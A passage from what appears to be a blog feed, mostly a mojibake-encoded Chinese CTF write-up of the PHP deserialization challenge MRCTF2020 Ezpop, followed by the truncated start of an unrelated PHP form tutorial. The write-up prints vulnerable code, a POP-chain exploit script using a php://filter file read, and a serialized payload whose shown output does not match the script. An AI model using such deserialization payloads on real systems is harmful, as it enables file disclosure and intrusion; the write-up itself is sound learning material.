    <content type="html"><![CDATA[<h4 id="0x00è§£é¢˜"><a href="#0x00è§£é¢˜" class="headerlink" title="0x00è§£é¢˜"></a>0x00è§£é¢˜</h4><p>å€Ÿé‰´åšå®¢</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpopâ€”åºåˆ—åŒ–popé“¾_marsxu626çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>è¿™é¢˜ä¸»è¦æ˜¯ä»£ç å®¡è®¡ï¼Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šæ„é€ popé“¾</p><p>ä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†è€Œè§£æå‡ ä¸ªä¸åŒçš„ç±»</p><p>1.Modifierç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variableï¼Œå˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæˆ‘åœ¨æŠŠæ–‡ä»¶æ”¾è¿›seayå®¡è®¡ç³»ç»Ÿé‡Œè·‘çš„æ—¶å€™å°±è·‘å‡ºäº†</p><p>includeæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè€Œè€…ä¹Ÿæ˜¯æˆ‘ä»¬æœ€åè¦è¾¾æˆçš„ç›®çš„ï¼š</p><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpä¼ªåè®®æ¥è¯»å–flagæ–‡ä»¶</p><p>è¿™é‡Œè¿˜æœ‰é­”æ³•æ–¹æ³•<strong>__invoke</strong> ï¼Œå½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è¦æŠŠModifierç±»è°ƒç”¨ä¸ºå‡½æ•°ã€‚</p><p>2.Showç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°äº†è¿™é‡Œçš„_wakeup()å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¸€å®šä¼šé¦–å…ˆè°ƒç”¨å…¶å‡½æ•°ï¼Œè¿‡æ»¤äº†ä¸è€å°‘å…³é”®å­—ï¼Œä½†æ˜¯åƒfilter://ä¼ªåè®®å´æ²¡æœ‰è¿‡æ»¤ã€‚</p><p>è€Œ_toStringæŠŠç±»å½“ä½œå­—ç¬¦ä¸²æ—¶è§¦å‘</p><p>æ‰€ä»¥å¾—å‡ºwakeupæ–¹æ³•å¯ä»¥è§¦å‘tostringæ–¹æ³•</p><p>3.Testç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰é­”æ³•æ–¹æ³•ï¼š<strong>__get</strong> ä»ä¸å¯è®¿é—®çš„å±æ€§ä¸­è¯»å–æ•°æ®ä¼šè§¦å‘<br>ä¼šè¿”å›functionä½œä¸ºå‡½æ•°è°ƒç”¨ã€‚</p><p>æ€è·¯å¾—å‡ºï¼š</p><p>â€‹        é¦–å…ˆååºåˆ—åŒ–å‡½æ•°ï¼Œè§¦å‘Showç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œwakeupæ–¹æ³•åšå­—ç¬¦ä¸²å¤„ç†ï¼Œè§¦å‘tosringæ–¹æ³•ï¼Œå¦‚æœå°†strå®ä¾‹åŒ–ä¸ºTestï¼Œå› ä¸ºTestç±»ä¸­ä¸å«sourceå±æ€§ï¼Œæ‰€ä»¥è°ƒç”¨getæ–¹æ³•ï¼Œå°†functionå®ä¾‹åŒ–ä¸ºModifierç±»ï¼Œå³å¯è§¦å‘å…¶ä¸­invokeæ–¹æ³•ï¼Œæœ€ç»ˆè°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¯»å–flag.php</p><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A4%3A%22Read%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure><p><img src="/2021/09/03/buu/19/image-20210904213507487.png" alt="image-20210904213507487"></p><p><img src="/2021/09/03/buu/19/image-20210904214001095.png" alt="image-20210904214001095"></p><h4 id="0x01çŸ¥è¯†ç‚¹"><a href="#0x01çŸ¥è¯†ç‚¹" class="headerlink" title="0x01çŸ¥è¯†ç‚¹"></a>0x01çŸ¥è¯†ç‚¹</h4><p>é€šè¿‡è¿™é¢˜å¥½å¥½å†æ¶è¡¥ä¸€æ¬¡æˆ‘çš„ä»£ç å®¡è®¡</p><h5 id="1-this-gt-p"><a href="#1-this-gt-p" class="headerlink" title="1.$this-&gt;p"></a>1.$this-&gt;p</h5><p>æ‘˜æŠ„äºä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/ytkah/p/9633690.html">https://www.cnblogs.com/ytkah/p/9633690.html</a></p><p>phpä¸­$this-&gt;çš„ç”¨æ³•ç®€å•ä»‹ç»</p><p>phpä¸­æˆ‘ä»¬ä¸€èˆ¬æ˜¯å…ˆå£°æ˜ä¸€ä¸ªç±»ï¼Œç„¶åç”¨è¿™ä¸ªç±»å»å®ä¾‹åŒ–å¯¹è±¡</p><p>$thisçš„å«ä¹‰æ˜¯è¡¨ç¤ºå®ä¾‹åŒ–åçš„å…·ä½“å¯¹è±¡</p><p>$this-&gt;è¡¨ç¤ºåœ¨ç±»æœ¬èº«å†…éƒ¨ä½¿ç”¨æœ¬ç±»çš„å±æ€§æˆ–è€…æ–¹æ³•</p><p>â€˜ -&gt; â€™ ç¬¦å·æ˜¯æ’å…¥å¼è§£å¼•ç”¨æ“ä½œç¬¦ã€‚</p><p>æ¢å¥è¯è¯´ï¼Œå®ƒæ˜¯æœ‰è°ƒç”¨ç”±å¼•ç”¨ä¼ é€’å‚æ•°çš„å­ç¨‹åºçš„æ–¹æ³•</p><p>ä¾‹å­ï¼š</p><p>æ¯”å¦‚æˆ‘ä»¬å£°æ˜ä¸€ä¸ªUserç±»ï¼Œå®ƒåªå«æœ‰ä¸€ä¸ªå±æ€§ $name</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬ç»™Userç±»åŠ ä¸ªæ–¹æ³•ï¼Œå°±ç”¨getName()æ–¹æ³•ï¼Œè¾“å‡º$nameçš„å€¼å§</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $_name;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿ</span></span><br><span class="line">$user1 = <span class="keyword">new</span> User();</span><br><span class="line">$user1-&gt;name = <span class="string">&#x27;å¼ ä¸‰&#x27;</span>;</span><br><span class="line">$user1-&gt;getName();        <span class="comment">//è¿™é‡Œå°±ä¼šè¾“å‡ºå¼ ä¸‰ï¼</span></span><br><span class="line">$user2 = <span class="keyword">new</span> User();</span><br><span class="line">$user2-&gt;name = <span class="string">&#x27;æå››&#x27;</span>;  </span><br><span class="line">$user2-&gt;getName();       <span class="comment">//è¿™é‡Œä¼šè¾“å‡ºæå››ï¼</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä¹Ÿä¸Šåœ¨çº¿å·¥å…·è¯•äº†ä¸‹</p><p><img src="/2021/09/03/buu/19/image-20210905155102186.png" alt="image-20210905155102186"></p><h5 id="2-PHPä¸­çš„é­”æœ¯æ–¹æ³•"><a href="#2-PHPä¸­çš„é­”æœ¯æ–¹æ³•" class="headerlink" title="2.PHPä¸­çš„é­”æœ¯æ–¹æ³•"></a>2.PHPä¸­çš„é­”æœ¯æ–¹æ³•</h5><p><a href="https://blog.csdn.net/weixin_45645113/article/details/105309695">https://blog.csdn.net/weixin_45645113/article/details/105309695</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__sleep() &#x2F;&#x2F;ä½¿ç”¨serializeæ—¶è§¦å‘</span><br><span class="line">__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() &#x2F;&#x2F;æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() &#x2F;&#x2F;å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><h5 id="3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "><a href="#3-è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç " class="headerlink" title="3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç "></a>3.è¿›ä¸€æ­¥ç†è§£æœ¬é¢˜ä»£ç </h5><p>_invoke()å‡½æ•°ï¼šå¯¹è±¡æœ¬èº«æ˜¯ä¸èƒ½å¤Ÿå½“ä½œå‡½æ•°ä½¿ç”¨çš„ï¼Œä¸€æ—¦è¢«å½“ä½œå‡½æ•°ä½¿ç”¨ï¼Œï¼Œå°±ä¼šå›è°ƒæ‰§è¡Œ _invoke()æ–¹æ³•</p><p>_construct()å‡½æ•°ï¼šæ„é€ å‡½æ•°/æ–¹æ³•</p><p>æ„é€ å‡½æ•°ï¼ˆconstructor methodï¼Œä¹Ÿç§°ä¸ºæ„é€ å™¨ï¼‰æ˜¯ç±»ä¸­çš„ä¸€ç§ç‰¹æ®Šå‡½æ•°ï¼Œå½“ä½¿ç”¨ new å…³é”®å­—å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œæ„é€ å‡½æ•°å°†ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __construct(å‚æ•°åˆ—è¡¨)&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_get()å‡½æ•°ï¼š è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è§¦å‘</p><p>ä½œè€…è¿™æ®µè¯ä»Šå¤©çœ‹æ‡‚äº†ç‚¹</p><p><img src="/2021/09/03/buu/19/image-20210905161234966.png" alt="image-20210905161234966"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00è§£é¢˜&quot;&gt;&lt;a href=&quot;#0x00è§£é¢˜&quot; class=&quot;headerlink&quot; title=&quot;0x00è§£é¢˜&quot;&gt;&lt;/a&gt;0x00è§£é¢˜&lt;/h4&gt;&lt;p&gt;å€Ÿé‰´åšå®¢&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_4395</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(ä¸€)</title>
    <link href="http://daweitech.github.io/2021/09/03/php/1/"/>
    <id>http://daweitech.github.io/2021/09/03/php/1/</id>
    <published>2021-09-03T02:51:22.000Z</published>
    <updated>2021-09-21T12:44:48.663Z</updated>
    
    <content type="html"><![CDATA[<p> ä»åˆ›å»ºç¤ºä¾‹Webåº”ç”¨å¼€å§‹ï¼šBobçš„æ±½è½¦é›¶éƒ¨ä»¶å•†åº—</p><p>åˆ›å»ºè®¢å•è¡¨å•ï¼š</p><p>ä»»ä½•æœåŠ¡å™¨ç«¯è„šæœ¬è¯­è¨€æœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ä¹‹ä¸€</p><p>1.1</p><p>å°±æ˜¯å¤„ç†HTMLè¡¨å•ã€‚</p><p>æ¥ä¸‹æ¥ç¨‹åºæ¸…å•1-1ï¼šorder.htmlï¼Œå•†åº—åŸºç¡€HTMLä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903110152375.png" alt="image-20210903110152375"></p><p>å‘ˆç°ç”»é¢</p><form action="processorder.php" method="post"><table style="border: 0px;"><tr style="background: #cccccc;">    <td style="width: 150px; text-align: center;">Item</td>    <td style="width: 15px; text-align: center;">Quantity</td></tr><tr>    <td>Tries</td>    <td><input type="text" name="tireqty" size="3" maxlength="3"></td></tr><tr>    <td>Oil</td>    <td><input type="text" name="oilqty" size="3" maxlength="3"></td></tr><tr>    <td>Spark Plugs</td>    <td><input type="text" name="sparkqty" size="3" maxlength="3"></td></tr><tr>    <td colspan="2" style="text-align" : center;"><input type="submit" value="Submit Order"></td>    </tr>    </table>    </form><p>æ³¨æ„ï¼šè¯¥è¡¨å•çš„actionå±æ€§è¢«è®¾ç½®ä¸ºèƒ½å¤Ÿå¤„ç†å®¢æˆ·è®¢å•çš„PHPè„šæœ¬åç§°ï¼Œåç»­ä¼šå¯¹è¯¥è„šæœ¬è¿›è¡Œå¢æ·»ã€‚</p><p>ä¸€èˆ¬åœ°ï¼Œactionså±æ€§å°±æ˜¯ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®æ—¶å°†è¦è½½å…¥çš„URL</p><p>ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥çš„æ•°æ®å°†æŒ‰ç…§methodå±æ€§ä¸­æŒ‡å®šçš„HTTPæ–¹æ³•å‘é€åˆ°è¿™ä¸ªURLï¼Œè¯¥æ–¹æ³•æ˜¯getï¼ˆé™„åŠ åœ¨URLçš„ç»“å°¾ï¼‰æˆ–è€…postï¼ˆä»¥å•ç‹¬çš„ä¿¡æ¯å‘é€ï¼‰ã€‚</p><p>1.2</p><p>è¡¨å•çš„å¤„ç†ï¼Œéœ€è¦åˆ›å»ºåœ¨formæ ‡è®°çš„actionå±æ€§ä¸­æŒ‡å®šçš„å¤„ç†è„šæœ¬ï¼Œè¯¥è„šæœ¬ä¸ºprocessorder.phpï¼Œä»£ç å¦‚ä¸‹</p><p><img src="/2021/09/03/php/1/image-20210903110937097.png" alt="image-20210903110937097"></p><p>æˆ‘ä»¬åœ¨h2å¤„æ·»åŠ äº†phpä»£ç </p><p>è¿™æ ·æˆ‘ä»¬çœ‹åˆ°phpçš„echoè¾“å‡ºè¯­å¥åŒæ—¶ï¼Œ</p><p>åœ¨htmlé¡µé¢ç‚¹å‡»Submit Orderä¹Ÿä¼šæœ‰ç±»ä¼¼å†…å®¹æ˜¾ç¤º</p><p><img src="/2021/09/03/php/1/image-20210903150404934.png" alt="image-20210903150404934"></p><p>è¯·æ³¨æ„</p><p>æˆ‘ä»¬æ‰€ç¼–å†™çš„PHPä»£ç æ˜¯å¦‚ä½•åµŒå…¥åˆ°ä¸€ä¸ªå¸¸è§çš„HTMLæ–‡ä»¶ä¸­çš„</p><p>é€šè¿‡æµè§ˆå™¨ï¼Œæˆ‘ä»¬æŸ¥çœ‹è¯¥HTMLçš„æºä»£ç </p><p><img src="/2021/09/03/php/1/image-20210903150637332.png" 